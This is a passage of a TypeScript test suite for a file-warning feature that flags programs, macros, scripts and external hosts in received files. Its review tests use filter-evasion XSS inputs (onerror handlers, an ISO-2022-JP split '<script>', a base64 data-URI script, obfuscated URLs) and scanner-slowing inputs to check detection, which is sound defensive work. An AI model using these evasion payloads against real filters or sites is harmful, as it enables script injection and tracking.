    { kind: 'internet', hosts: ['a.example', 'b.example', 'c.example'], opensIn: 'pdf' },
    { kind: 'pdf-scripts', onOpen: true },
    { kind: 'pdf-scripts', onOpen: false },
    { kind: 'pdf-launch' },
    { kind: 'attachments' },
    { kind: 'inside', files: [{ name: 'setup.exe', warnings: [{ kind: 'program' }] }] },
    { kind: 'inside', files: [{ name: 'a.docm', warnings: [{ kind: 'macros' }] }] },
    { kind: 'inside', files: [{ name: 'a.docm', warnings: [{ kind: 'macros' }] }, { name: 'b.pdf', warnings: [{ kind: 'attachments' }] }] },
    { kind: 'locked' },
    { kind: 'web-page', hosts: [] },
    { kind: 'web-page', hosts: ['t.example'] },
    { kind: 'web-scripts' },
    { kind: 'unread' },
  ]

  test('every warning has a line, and its sheet starts saying nothing in it can run here', () => {
    for (const w of every) assert.ok(copy.LINE(w).length > 10, w.kind)
    assert.equal(copy.HERE, 'Nothing in it can run here.')
    assert.match(copy.HERE_MORE, /never runs them, and a file can’t make it contact any website\. It’s only a risk once you save it and open it in another program\.$/)
    const ui = readFileSync(new URL('../src/ui/fileWarn.ts', import.meta.url), 'utf8')
    assert.match(ui, /replaceChildren\(here, \.\.\.inside, \.\.\.why\)/)
  })

  test('your browser checks, never the site, and nothing is called safe', () => {
    const all = [copy.HERE, copy.HERE_MORE, ...every.flatMap((w) => [copy.LINE(w), ...copy.WHY(w)])].join(' ')
    assert.ok(!/Slynk|slynk\.me|\bwe\b|\bus\b|\bour\b|server/i.test(all), all)
    assert.ok(!/\bsafe\b|\bclean\b|virus/i.test(all), all)
    assert.match(all, /Your browser only checked what kind of file it is, not whether it’s harmful\./)
  })

  test('the lines as approved, with the sites named', () => {
    assert.equal(copy.LINE({ kind: 'program' }), 'This is a program. Open it only if you trust who sent it.')
    assert.equal(copy.LINE({ kind: 'disguised', claimed: '.pdf', real: 'program' }), 'Its name says .pdf, but it’s really a program.')
    assert.equal(copy.LINE({ kind: 'internet', hosts: ['a.example'], opensIn: 'office' }), 'Tries to contact a.example when opened.')
    assert.equal(copy.LINE({ kind: 'internet', hosts: ['a.example', 'b.example'], opensIn: 'office' }), 'Tries to contact a.example and b.example when opened.')
    assert.equal(copy.LINE({ kind: 'internet', hosts: ['a.example', 'b.example', 'c.example'], opensIn: 'office' }), 'Tries to contact a.example and 2 other sites when opened.')
    assert.match(copy.WHY({ kind: 'internet', hosts: ['a.example'], opensIn: 'office' })[0], /^Opened in Word, Excel or PowerPoint, it may fetch something from a\.example, which would see your internet address and the time\./)
  })

  test('a zip: programs inside first, else how many files have warnings; its sheet says why under each file, once', () => {
    const program = { name: 'setup.exe', warnings: [{ kind: 'program' }] } as const
    const macros = { name: 'a.docm', warnings: [{ kind: 'macros' }] } as const
    assert.equal(copy.LINE({ kind: 'inside', files: [macros, program] }), 'Has programs inside.')
    assert.equal(copy.LINE({ kind: 'inside', files: [{ name: 'x.zip', warnings: [{ kind: 'inside', files: [program] }] }] }), 'Has programs inside.')
    assert.equal(copy.LINE({ kind: 'inside', files: [macros] }), 'A file inside has a warning.')
    assert.equal(copy.LINE({ kind: 'inside', files: [macros, { ...macros, name: 'b.docm' }, { name: 'c.pdf', warnings: [{ kind: 'attachments' }] }] }), '3 files inside have warnings.')
    const ui = readFileSync(new URL('../src/ui/fileWarn.ts', import.meta.url), 'utf8')
    assert.match(ui, /for \(const text of copy\.WHY\(w\)\) if \(!said\.has\(text\) && said\.add\(text\)\) li\.append/)
    assert.equal(copy.MORE_INSIDE(1), 'And 1 more file.')
    assert.equal(copy.MORE_INSIDE(5), 'And 5 more files.')
  })

  test('the received screen and its rows show them, the composer doesn’t; auto-save waits for a warned file', () => {
    const src = (f: string) => readFileSync(new URL(`../src/${f}`, import.meta.url), 'utf8')
    const main = src('main.ts')
    assert.match(main, /async function autoSave\(\) \{[\s\S]*?await Promise\.all\(files\.map\(warningsFor\)\)[\s\S]*?if \(warned\) toast\(fileWarnCopy\.AUTO_SAVE_HELD/)
    assert.match(main, /showWarnings\(\$\('r-warns'\), warnings\)/)
    assert.match(src('ui/items.ts'), /warningsFor\(item\)\.then/)
    // Recipients only: they're the ones a harmful file is aimed at.
    assert.ok(!/fileWarn|checkFile/.test(src('tray.ts')))
    // Each line is one button ending in an ⓘ, which screen readers hear as "Why?".
    const ui = src('ui/fileWarn.ts')
    assert.match(ui, /button\.className = 'file-warn'/)
    assert.match(ui, /aria-label', `\$\{copy\.LINE\(w\)\} \$\{copy\.WHY_LABEL\}`/)
    assert.match(ui, /infoIcon\(\)/)
    const html = readFileSync(new URL('../index.html', import.meta.url), 'utf8')
    assert.match(html, /id="file-warn"[\s\S]*?href="\/about\/#file-checks"/)
    assert.match(html, /Otherwise they wait for Save, as files with a warning always do\./)
  })
})

test('web pages’ words: every one can contact websites in a browser, "such as" the sites seen; scripts can reach others; playlists', () => {
  assert.equal(copy.LINE({ kind: 'web-page', hosts: [] }), 'Can contact websites if opened in a browser.')
  assert.equal(copy.LINE({ kind: 'web-page', hosts: ['t.example'] }), 'Can contact websites, such as t.example, if opened in a browser.')
  assert.deepEqual(copy.WHY({ kind: 'web-page', hosts: [] }), [
    'Opened in a browser, a web page can fetch things from websites, which would see your internet address and the time. Opening it offline or with a VPN avoids it.',
  ])
  assert.deepEqual(copy.WHY({ kind: 'web-page', hosts: ['t.example', 'u.example'] }), [
    'Opened in a browser, a web page can fetch things from websites (this one from t.example and u.example, and maybe others), which would see your internet address and the time. Opening it offline or with a VPN avoids it.',
  ])
  assert.deepEqual(copy.WHY({ kind: 'web-scripts' }), ['Its scripts can do what a website does, such as contact sites that aren’t named here.'])
  assert.equal(copy.LINE({ kind: 'internet', hosts: ['radio.example'], opensIn: 'player' }), 'Tries to contact radio.example when opened.')
  assert.match(copy.WHY({ kind: 'internet', hosts: ['radio.example'], opensIn: 'player' })[0], /^Opened in a media player, it may fetch something from radio\.example/)
  const about = readFileSync(new URL('../about/index.html', import.meta.url), 'utf8').replace(/\s+/g, ' ')
  assert.match(about, /It can tell you if the file is a program, has macros or scripts, or will try to contact the internet when opened, as any web page or SVG drawing can in a browser, and checks each file in a zip the same way/)
})

describe('web pages: the review (2026-10-26)', () => {
  const kindsOf = async (text: string | Uint8Array, name: string) => check(typeof text === 'string' ? strToU8(text) : text, name)
  const hostsOf = async (text: string, name = 'page.html') => {
    const w = (await checkBytes(strToU8(text), name)).find((x) => x.kind === 'web-page')
    return w?.kind === 'web-page' ? w.hosts : undefined
  }

  test('a crafted style sheet can’t make the check slow enough to hide a zip’s program', async () => {
    const t = performance.now()
    await checkBytes(strToU8('<style>' + 'url(a'.repeat(400_000)), 'a.html')
    await checkBytes(strToU8('<style>'.repeat(500_000)), 'a.html')
    await checkBytes(strToU8('<i src=x:>'.repeat(800_000)), 'a.html')
    await checkBytes(strToU8('<p title="'.repeat(500_000)), 'a.html')
    await checkBytes(strToU8('<?xml-stylesheet '.repeat(400_000)), 'a.xml')
    assert.ok(performance.now() - t < 6000, `${Math.round(performance.now() - t)} ms`)
    const z = zip({ 'setup.exe': windowsProgram(), 'page.html': strToU8('<style>' + 'url(a'.repeat(20_000)) })
    assert.deepEqual(kinds(await checkBytes(z, 'z.zip')), ['inside'])
    const inside = (await checkBytes(z, 'z.zip'))[0]
    assert.ok(inside.kind === 'inside' && inside.files.some((f) => f.name === 'setup.exe' && f.warnings.some((w) => w.kind === 'program')))
  })

  test('scripts written so the old check missed them: after a slash, after a quote, past a "<" or ">" in quotes, in ISO-2022-JP', async () => {
    for (const page of ['<img/onerror=alert(1) src=x>', '<svg/onload=go()>', '<img src="x"onerror=alert(1)>', '<img alt="<" src=x onerror=alert(1)>', '<img alt=">" src=x onerror=alert(1)>'])
      assert.deepEqual(await kindsOf(page, 'a.html'), ['web-page', 'web-scripts'], page)
    // "<scr" ESC ( B "ipt>": a browser reading the page as ISO-2022-JP sees <script>.
    assert.deepEqual(await kindsOf('<meta charset="iso-2022-jp"><scr\x1b(Bipt>fetch("//t.example")</script>', 'a.html'), ['web-page', 'web-scripts'])
    // A page inside the page, as srcdoc or data, read as one: its scripts and its sites.
    assert.deepEqual(await kindsOf('<iframe srcdoc="&lt;img src=x onerror=go()&gt;"></iframe>', 'a.html'), ['web-page', 'web-scripts'])
    assert.deepEqual(await kindsOf('<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnLy90LmV4YW1wbGUnKTwvc2NyaXB0Pg=="></iframe>', 'a.html'), ['web-page', 'web-scripts'])
    assert.deepEqual(await hostsOf('<iframe srcdoc="&lt;img src=&quot;https://inner.example/p.gif&quot;&gt;"></iframe>'), ['inner.example'])
    // Prose about "one=two" isn't a handler; a handler's name in a script's text is the script's.
    assert.deepEqual(await kindsOf('<p>Some one=two text, "one=three", and /one=four</p>', 'a.html'), ['web-page'])
  })

  test('sites a sender could hide, and ones nothing fetches', async () => {
    // A second picture after a slash isn't hidden behind the first.
    assert.deepEqual(await hostsOf('<img src="https://cdn.example/a.png"><img/src="https://t.example/b.png">'), ['cdn.example', 't.example'])
    // As a browser reads an address: &colon; and numeric references, tabs and line breaks in it.
    assert.deepEqual(await hostsOf('<img src="https&colon;//colon.example/x"><img src="https&#58//num.example/x"><img src="ht\ttps://tab.example/x">'), ['colon.example', 'num.example', 'tab.example'])
    assert.deepEqual(await hostsOf('<img alt=">" src="https://after.example/x">'), ['after.example'])
    assert.deepEqual(await hostsOf('<meta http-equiv=refresh content="0; https://bare.example/">'), ['bare.example'])
    assert.deepEqual(await hostsOf('<?xml-stylesheet type="text/css" href="https://pi.example/s.css"?><svg xmlns="http://www.w3.org/2000/svg"/>', 'a.svg'), ['pi.example'])
    // A canonical or alternate link only names a page; a stylesheet or icon is fetched.
    assert.deepEqual(await hostsOf('<link rel=canonical href="https://site.example/"><link rel="alternate" href="https://alt.example/"><link rel="shortcut icon" href="https://icon.example/f.ico">'), ['icon.example'])
    // A script's text isn't read for sites (it's code, not tags), but the page runs scripts.
    assert.deepEqual(await hostsOf('<script>var s = \'<img src="https://code.example/x">\'</script><img src="https://after-script.example/y">'), ['after-script.example'])
    // Comments are skipped, as a browser skips them.
    assert.deepEqual(await hostsOf('<!-- <img src="https://commented.example/x"> --><p>hi</p>'), [])
  })

  test('.mht, which browsers open with only what it holds: the general line alone', async () => {
    assert.deepEqual(await checkBytes(strToU8('<img src="https://t.example/x"><script>go()</script>'), 'saved.mht'), [{ kind: 'web-page', hosts: [] }])
  })

  test('more that opens in a browser or fetches: a gzipped SVG, XML that renders as a page, a Mac’s web locations, playlists, a name that’s only an ending', async () => {
    assert.deepEqual(await kindsOf(gzipSync(strToU8('<svg xmlns="http://www.w3.org/2000/svg"/>')), 'logo.svgz'), ['web-page'])
    for (const xml of ['<?xml-stylesheet href="https://x.example/s.xsl"?><r/>', '<html xmlns="http://www.w3.org/1999/xhtml"><img src="https://x.example/p"/></html>', '<!DOCTYPE r [<!ENTITY n "x">]><r/>'])
      assert.deepEqual(await kindsOf(xml, 'feed.xml'), ['web-page'], xml)
    // XML that's data, like an Office file's own parts, says nothing.
    assert.deepEqual(await kindsOf('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>', 'parts.xml'), [])
    for (const name of ['a.webloc', 'b.inetloc', 'c.fileloc']) assert.deepEqual(await kindsOf('<plist><dict><key>URL</key><string>https://x.example/</string></dict></plist>', name), ['script'], name)
    assert.deepEqual(await checkBytes(strToU8('#EXTM3U\n#EXTINF:-1,Radio\nhttps://stream.example/live.mp3\nlocal.mp3\n'), 'radio.m3u'), [{ kind: 'internet', hosts: ['stream.example'], opensIn: 'player' }])
    assert.deepEqual(await checkBytes(strToU8('[playlist]\nFile1=http://pls.example/a\n'), 'a.pls'), [{ kind: 'internet', hosts: ['pls.example'], opensIn: 'player' }])
    assert.deepEqual(await kindsOf('#EXTM3U\nsong one.mp3\nsong two.mp3\n', 'mine.m3u'), [])
    const z = zip({ 'docs/.html': strToU8('<p>hi</p>'), 'run/.bat': strToU8('echo hi') })
    const inside = (await checkBytes(z, 'z.zip'))[0]
    assert.ok(inside.kind === 'inside')
    assert.deepEqual(inside.files.map((f) => [f.name, kinds(f.warnings)]), [['docs/.html', ['web-page']], ['run/.bat', ['script']]])
  })
})
